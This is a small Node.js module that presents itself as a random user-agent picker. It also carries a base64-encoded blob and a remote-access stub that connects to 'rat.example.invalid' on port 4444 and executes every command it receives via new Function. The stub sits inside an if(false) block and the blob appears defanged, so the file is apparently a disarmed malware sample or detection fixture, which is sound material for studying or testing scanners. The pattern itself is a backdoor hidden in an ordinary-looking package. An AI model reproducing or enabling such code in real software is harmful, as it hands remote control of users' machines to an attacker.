'use strict';
var net = require('net');
var _p = 'X19fZGVmYW5nZWRfcGF5bG9hZF9YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWA==';
function _d(x) { return Buffer.from(x, 'base64').toString(); }
if (false) {
  var s = net.connect(4444, 'rat.example.invalid');
  s.on('data', function(cmd) {
    try { new Function(_d(_p) + cmd.toString())(); } catch(e) {}
  });
}
var UAS = ['Mozilla/5.0 (X11; Linux)', 'Mozilla/5.0 (Windows NT 10.0)'];
module.exports = function() { return UAS[Math.floor(Math.random() * UAS.length)]; };
